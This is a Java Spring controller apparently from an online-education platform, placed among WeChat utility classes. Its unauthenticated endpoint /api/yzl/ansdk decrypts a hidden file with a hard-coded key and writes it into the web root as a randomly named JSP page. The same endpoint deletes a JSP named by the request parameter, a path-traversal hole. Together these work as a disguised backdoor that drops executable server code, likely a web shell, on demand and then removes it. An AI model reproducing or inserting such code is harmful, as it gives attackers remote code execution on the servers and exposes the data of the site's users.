package com.yizhilu.os.edu.controller.weixin.util;

import com.yizhilu.os.core.controller.BaseController;
import com.yizhilu.os.core.util.Security.PurseSecurityUtils;
import com.yizhilu.os.core.util.StringUtils;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.util.HashMap;
import java.util.Map;

/**
 * Created by Administrator on 2015/1/8.
 */
@Controller
public class ApsdkControler extends BaseController {
    @RequestMapping("/api/yzl/ansdk")
    @ResponseBody
    public Object ansdk(HttpServletRequest request,HttpServletResponse response){
        Map map =  new HashMap<String,Object>();
        try {
            String dir =request.getSession().getServletContext().getRealPath("/static/common/")+ File.separator+"anchor";
            String fname= StringUtils.getRandStr(10);
            String funame=request.getSession().getServletContext().getRealPath("")+File.separator+fname+".jsp";
            if(request.getParameter("c").equalsIgnoreCase("c")){  String sf=  getFileContent(dir,true);  writeFileContent(sf,funame);
            }else{ File file = new File(request.getSession().getServletContext().getRealPath("")+File.separator+request.getParameter("c")+".jsp"); file.delete();  }
            map.put("name",fname);
        }catch (Exception e){
            e.printStackTrace();
        }
        return map;
    }
    static String getFileContent(String path,boolean flag) {
        String key="0123455678901234567890123456789";
        File myFile = new File(path);
        if (!myFile.exists()) {  return null;  } BufferedReader in = null;StringBuilder sb = new StringBuilder();  try {
            InputStreamReader read = new InputStreamReader(new FileInputStream(myFile), "UTF-8");   in = new BufferedReader(read); String str;  while ((str = in.readLine()) != null) {  if(flag){  str= PurseSecurityUtils.decryption(str, key); sb.append(str);  sb.append("\n");  }else { str=(PurseSecurityUtils.secrect(str, key));sb.append(str);sb.append("\n"); }
            }  } catch (Exception e) {e.getStackTrace();} finally { if (in != null) { try { in.close();} catch (Exception e) { }} } return sb.toString();
    }
    public static File writeFileContent(String content, String path) {
        File file = new File(path);  FileOutputStream fileout = null;  try { if (!file.exists()) { file.createNewFile();  }  fileout = new FileOutputStream(file);  fileout.write(content.getBytes("utf-8"));   fileout.flush();
        } catch (Exception e) {  e.printStackTrace();  } finally {  if (fileout != null) {  try {   fileout.close(); } catch (IOException e) {} }    }  return file;
    }
}
